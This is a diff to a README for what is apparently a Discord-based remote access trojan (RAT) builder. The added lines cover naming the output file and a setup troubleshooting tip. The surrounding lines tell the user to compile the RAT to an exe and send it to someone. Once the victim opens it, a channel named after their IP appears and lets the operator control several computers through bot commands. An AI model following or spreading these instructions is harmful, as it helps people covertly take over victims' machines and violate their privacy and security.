@@ -81,11 +81,19 @@ After you have done step 1, you are able to generate the rat file that you will 
 
 **7.** It should then ask whether you want the rat to be an exe. I ****HIGHLY**** RECOMMEND you choose yes by inputting y. otherwise it will be a .py file
 
-**8.** After that, if you chose no to the exe conversion part, you should see a .py file in the build folder of the script. But if you chose yes, it should take a minute and convert the file to an exe, after its done, it should be located in the build folder.
+**8.** It should then ask you for the name of the file, you can change this later. ONLY ENTER THE NAME OF THE FILE. Do NOT add the file extension as it is done automatically
+  - GOOD example of what you should enter "rat"
+  - BAD example of what you should enter "rat.exe", "rat.py", "rat.bat", etc
+
+**9.** After that, if you chose no to the exe conversion part, you should see a .py file in the build folder of the script. But if you chose yes, it should take a minute and convert the file to an exe, after its done, it should be located in the build folder.
 
 After you have completed all these steps, you can send the exe to someone, and if they open it, inside of the server you made, it should create a channel with the name being their ip(this was so that the bot can differenciate computers allowing you to hold multiple pc's at the same time)
 From there, type !help and the bot should send you a message containing all the commands.
 
 # Problems and solutions
 
+### Setup.bat doesnt work!
+- If setup.bat does not work, ensure that you have python installed
+
+###  
 
